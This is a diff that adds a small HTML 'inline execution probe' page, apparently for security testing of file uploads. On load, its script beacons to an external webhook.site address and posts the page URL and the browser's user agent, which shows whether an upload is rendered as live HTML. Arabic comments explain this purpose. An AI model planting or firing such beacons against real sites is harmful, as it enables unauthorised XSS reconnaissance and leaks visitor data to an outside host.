@@ -1,0 +1,31 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Inline Execution Probe</title>
+<script>
+(async () => {
+  const WEBHOOK_URL = "https://d2ddf3bd-e72c-464e-8ef2-550be0d6c0d9.webhook.site";
+  // لو نفّذنا هنا، فهذا يعني الرابط اتعرض كـ HTML/وثيقة (مش صورة)
+  try { await fetch(WEBHOOK_URL + "/?inline=1", {mode:"no-cors"}); } catch(e) {}
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        kind: "html-inline-probe",
+        ts: Date.now(),
+        href: location.href,
+        ua: navigator.userAgent
+      })
+    });
+  } catch(e) {}
+})();
+</script>
+<body>
+  <h1>Inline Probe</h1>
+  <p>إذا وصلك <code>?inline=1</code> على الويبهوك، فالتنفيذ كان inline.</p>
+</body>
+
+
+
+
+
